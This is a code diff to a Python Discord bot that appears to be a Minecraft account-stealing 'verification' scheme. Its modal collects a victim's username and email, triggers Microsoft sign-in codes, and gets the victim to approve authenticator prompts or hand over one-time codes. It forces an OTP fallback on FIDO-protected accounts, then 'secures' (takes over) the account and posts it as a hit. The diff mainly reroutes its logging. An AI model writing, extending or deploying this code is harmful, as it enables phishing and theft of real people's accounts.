@@ -14,6 +14,7 @@ from views.buttons.accountInfo import accountInfo
 
 from views.utils.startSecure import startSecuringAccount
 from views.utils.initialSession import getSession
+from views.utils.sendLogs import sendLogs
 from views.utils.sendAuth import sendAuth
 
 class MyModalOne(ui.Modal):
@@ -22,12 +23,11 @@ class MyModalOne(ui.Modal):
         self.add_item(ui.InputText(label="Minecraft Username", required = True))
         self.add_item(ui.InputText(label="Minecraft Email", required = True))
 
-    async def callback(self, interaction: discord.Interaction) -> None: 
+    async def callback(self, interaction: discord.Interaction) -> None:
         username = quote(self.children[0].value)
         email = self.children[1].value
         config = json.load(open("config.json", "r+"))
 
-        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
         # Blacklisted Users
@@ -38,21 +38,23 @@ class MyModalOne(ui.Modal):
                         title = "Could not verify",
                         description = "Our systems seem to be down at the moment. Please try again in a few hours.",
                         color = 0xFF5C5C
-                    ), 
+                    ),
                     ephemeral = True
                 )
 
-                await logs_channel.send(
-                    embed = Embed(
+                await sendLogs(
+                    interaction.client, config,
+                    Embed(
                         title = f"User | {interaction.user.name} ({interaction.user.id})",
                         description = f"**Email** | **Status** | **Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
                         timestamp = datetime.datetime.now(),
-                        colour = 0xFF5C5C                         
-                    ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-                    view = ButtonOptions(interaction.user)
+                        colour = 0xFF5C5C
+                    ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                    view = ButtonOptions(interaction.user),
+                    email = email
                 )
                 return
-        
+
         # Check if email is valid
         if re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$").match(email) is None:
             await interaction.response.send_message(
@@ -64,14 +66,16 @@ class MyModalOne(ui.Modal):
                 ephemeral = True
             )
 
-            await logs_channel.send(
-                embed = Embed(
+            await sendLogs(
+                interaction.client, config,
+                Embed(
                     title = f"User | {interaction.user.name} ({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to Verify | Invalid email entered```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0xFF5C5C                         
-                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user)
+                    colour = 0xFF5C5C
+                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                view = ButtonOptions(interaction.user),
+                email = email
             )
             return
 
@@ -82,38 +86,39 @@ class MyModalOne(ui.Modal):
         # Sends OTP/Auth code
         emailInfo = await sendAuth(self.session, email)
         print(emailInfo)
-        
+
         # Email does not exist (ifExistsResults == 1 can be used as an alternative)
         if "Credentials" not in emailInfo:
-            await logs_channel.send(
-                embed = Embed(
+            await sendLogs(
+                interaction.client, config,
+                Embed(
                     title = f"User | {interaction.user.name} ({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | Email does not exist```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0xFF5C5C                         
-                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user)
+                    colour = 0xFF5C5C
+                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                view = ButtonOptions(interaction.user),
+                email = email
             )
 
             await interaction.followup.send(
-                    embed = Embed(
+                embed = Embed(
                     title = ":x: Failed to verify",
                     description = "The email you entered does not exist, make sure you entered it correctly!",
                     color = 0xFF5C5C
                 ),
                 ephemeral = True
             )
-
             return
 
-        # Entropy = Authenticator App number to click in  
+        # Entropy = Authenticator App number to click in
         elif "RemoteNgcParams" in emailInfo["Credentials"]:
             print("\n| Starting securing process |\n")
             print("[+] - Found Authenticator App")
 
             device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
             entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]
-                
+
             await interaction.followup.send(
                 embed = Embed(
                     title="Last Step",
@@ -123,14 +128,17 @@ class MyModalOne(ui.Modal):
                 ephemeral = True
             )
 
-            sucessEmbed = Embed(
-                title = f"User | {interaction.user.name}",
-                description=f"Username | Email | Status\n```{username} | {email} | Waiting for Auth confirmation```",
-                timestamp = datetime.datetime.now(),
-                colour = 0x678DC6,                         
-            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}")
-
-            await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
+            await sendLogs(
+                interaction.client, config,
+                Embed(
+                    title = f"User | {interaction.user.name}",
+                    description=f"Username | Email | Status\n```{username} | {email} | Waiting for Auth confirmation```",
+                    timestamp = datetime.datetime.now(),
+                    colour = 0x678DC6,
+                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                view = ButtonOptions(interaction.user),
+                email = email
+            )
 
             # Checks every second for the authenticator state
             async def checkCode(flowToken):
@@ -146,10 +154,10 @@ class MyModalOne(ui.Modal):
                     },
                     json = {
                         "DeviceCode": flowToken
-                    }    
+                    }
                 )
                 return response.json()
-            
+
             i = 0
             while i < 60:
 
@@ -167,30 +175,36 @@ class MyModalOne(ui.Modal):
                         ephemeral = True
                     )
 
-                    await logs_channel.send(
-                        embed = Embed(
+                    await sendLogs(
+                        interaction.client, config,
+                        Embed(
                             title = f"User | {interaction.user.name} ({interaction.user.id})",
                             description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
                             timestamp = datetime.datetime.now(),
-                            colour = 0xFF5C5C                  
-                        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-                        view = ButtonOptions(interaction.user)
+                            colour = 0xFF5C5C
+                        ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                        view = ButtonOptions(interaction.user),
+                        email = email
                     )
                     return
-                
-                elif data["SessionState"] > 1 and data["AuthorizationState"] > 1:
-                    
-                    sucessEmbed = Embed (
-                        title = f"User | {interaction.user.name}",
-                        description=f"Username | Email | Status\n```{username} | {email} | Auth code confirmed!```",
-                        timestamp = datetime.datetime.now(),
-                        colour = 0x79D990,                           
-                    ).set_thumbnail(
-                        url= f"https://visage.surgeplay.com/full/512/{username}"
-                    )
 
-                    await logs_channel.send("**This account is being automaticly secured**")
-                    await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
+                elif data["SessionState"] > 1 and data["AuthorizationState"] > 1:
+
+                    await sendLogs(
+                        interaction.client, config,
+                        content="**This account is being automaticly secured**"
+                    )
+                    await sendLogs(
+                        interaction.client, config,
+                        Embed(
+                            title = f"User | {interaction.user.name}",
+                            description=f"Username | Email | Status\n```{username} | {email} | Auth code confirmed!```",
+                            timestamp = datetime.datetime.now(),
+                            colour = 0x79D990,
+                        ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                        view = ButtonOptions(interaction.user),
+                        email = email
+                    )
 
                     await interaction.followup.send(
                         embed = discord.Embed(
@@ -200,22 +214,24 @@ class MyModalOne(ui.Modal):
                         ),
                         ephemeral = True
                     )
-                    
+
                     # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
-                    securedAccount = await startSecuringAccount(self.session, email, device) 
+                    securedAccount = await startSecuringAccount(self.session, email, device)
 
                     if not securedAccount:
-                        await logs_channel.send(
-                            embed = Embed(
+                        await sendLogs(
+                            interaction.client, config,
+                            Embed(
                                 title = f"User | {interaction.user.name} ({interaction.user.id})",
                                 description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
                                 timestamp = datetime.datetime.now(),
-                                colour = 0xFF5C5C                  
-                            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-                            view = ButtonOptions(interaction.user)
+                                colour = 0xFF5C5C
+                            ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                            view = ButtonOptions(interaction.user),
+                            email = email
                         )
                         return
-                    
+
                     await hits_channel.send("@everyone **Successfully secured an account**")
                     await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
                     await hits_channel.send(
@@ -225,12 +241,12 @@ class MyModalOne(ui.Modal):
                         )
                     )
                     return
-                
+
                 await asyncio.sleep(1)
                 i += 1
 
             await interaction.followup.send(
-                    embed = Embed(
+                embed = Embed(
                     title = ":x: Failed to verify",
                     description = "You pressed the wrong number on your authenticator app. Try again!",
                     colour=0x00FF00
@@ -238,21 +254,20 @@ class MyModalOne(ui.Modal):
                 ephemeral = True
             )
 
-            await logs_channel.send(
-               embed = Embed(
+            await sendLogs(
+                interaction.client, config,
+                Embed(
                     title = f"User | {interaction.user.name}",
                     description=f"Username | Email | Status\n```{username} | {email} | Failed to confirm for Auth```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0xDE755B              
-                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user)  
+                    colour = 0xDE755B
+                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                view = ButtonOptions(interaction.user),
+                email = email
             )
             return
-        
+
         elif "FidoParams" in emailInfo["Credentials"]:
-            # Account has a FIDO security key as primary 2FA.
-            # Re-call GetCredentialType with forceotclogin=True and isFidoSupported=False
-            # so Microsoft falls back to sending an OTP to the account's recovery proof.
             print("[~] - FIDO detected, forcing OTP fallback...")
 
             emailInfo = await sendAuth(self.session, email, forceotc=True)
@@ -267,19 +282,20 @@ class MyModalOne(ui.Modal):
                     view=ButtonViewThree(),
                     ephemeral=True
                 )
-                await logs_channel.send(
-                    embed=Embed(
+                await sendLogs(
+                    interaction.client, config,
+                    Embed(
                         title=f"User | {interaction.user.name} ({interaction.user.id})",
                         description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | FIDO fallback returned no credentials```",
                         timestamp=datetime.datetime.now(),
                         colour=0xFF5C5C
                     ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
-                    view=ButtonOptions(interaction.user)
+                    view=ButtonOptions(interaction.user),
+                    email=email
                 )
                 return
 
             if "FidoParams" in emailInfo["Credentials"]:
-                # Still FIDO after forceotc — account has no OTP backup proofs at all
                 print("[X] - FIDO account has no OTP fallback proofs available")
                 await interaction.followup.send(
                     embed=Embed(
@@ -289,19 +305,19 @@ class MyModalOne(ui.Modal):
                     ),
                     ephemeral=True
                 )
-                await logs_channel.send(
-                    embed=Embed(
+                await sendLogs(
+                    interaction.client, config,
+                    Embed(
                         title=f"User | {interaction.user.name} ({interaction.user.id})",
                         description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | FIDO-only account, no OTP proofs available```",
                         timestamp=datetime.datetime.now(),
                         colour=0xFF5C5C
                     ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
-                    view=ButtonOptions(interaction.user)
+                    view=ButtonOptions(interaction.user),
+                    email=email
                 )
                 return
 
-            # Fall through — emailInfo now has OtcLoginEligibleProofs (or RemoteNgcParams),
-            # which will be caught by the branches below. Re-evaluate by falling into them.
             print("[+] - FIDO forceotc fallback succeeded, continuing with OTP flow")
 
         if "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
@@ -313,7 +329,7 @@ class MyModalOne(ui.Modal):
                 if value.get("otcSent"):
                     verflowtoken = value["data"]
                     verEmail = value["display"]
-                    break 
+                    break
 
             if not verEmail or not verflowtoken:
                 print("[X] - OtcLoginEligibleProofs found but no proof had otcSent=True")
@@ -325,14 +341,16 @@ class MyModalOne(ui.Modal):
                     view=ButtonViewThree(),
                     ephemeral=True
                 )
-                await logs_channel.send(
-                    embed=Embed(
+                await sendLogs(
+                    interaction.client, config,
+                    Embed(
                         title=f"User | {interaction.user.name} ({interaction.user.id})",
                         description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | No OTP code was sent to any proof```",
                         timestamp=datetime.datetime.now(),
                         colour=0xFF5C5C
                     ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
-                    view=ButtonOptions(interaction.user)
+                    view=ButtonOptions(interaction.user),
+                    email=email
                 )
                 return
 
@@ -353,24 +371,29 @@ class MyModalOne(ui.Modal):
                 ephemeral = True
             )
 
-            sucessEmbed = Embed (
+            await sendLogs(
+                interaction.client, config,
+                Embed(
                     title = f"User | {interaction.user.name}",
                     description=f"Username | Email | Status\n```{username} | {email} | Waiting for OTP code```",
                     timestamp = datetime.datetime.now(),
-                    colour = 0x678DC6,                         
-            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}")
-
-            await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
+                    colour = 0x678DC6,
+                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+                view = ButtonOptions(interaction.user),
+                email = email
+            )
             return
-        
-        await logs_channel.send(
-            embed = Embed(
+
+        await sendLogs(
+            interaction.client, config,
+            Embed(
                 title = f"User | {interaction.user.name} ({interaction.user.id})",
                 description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | No OTP methods found```",
                 timestamp = datetime.datetime.now(),
-                colour = 0xFF5C5C                  
-            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-            view = ButtonOptions(interaction.user)  
+                colour = 0xFF5C5C
+            ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}"),
+            view = ButtonOptions(interaction.user),
+            email = email
         )
 
         await interaction.followup.send(
@@ -381,5 +404,5 @@ class MyModalOne(ui.Modal):
             view = ButtonViewThree(),
             ephemeral = True
         )
-        
+
         return
